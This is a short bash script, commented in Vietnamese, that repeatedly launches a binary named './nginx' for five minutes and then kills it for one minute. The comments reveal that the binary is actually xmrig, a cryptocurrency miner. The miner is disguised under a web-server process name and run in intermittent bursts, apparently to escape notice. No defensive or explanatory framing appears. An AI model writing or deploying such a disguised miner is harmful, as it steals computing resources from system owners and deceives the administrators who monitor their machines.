#!/bin/bash

while true; do
    # Chạy xmrig
    ./nginx &
    # Lưu lại PID của xmrig
    nginx_pid=$!
    
    # Chờ 5 phút
    sleep 300
    
    # Dừng xmrig (sau 5 phút)
    kill $nginx_pid
    
    # Nghỉ 1 phút trước khi chạy lại
    sleep 60
done
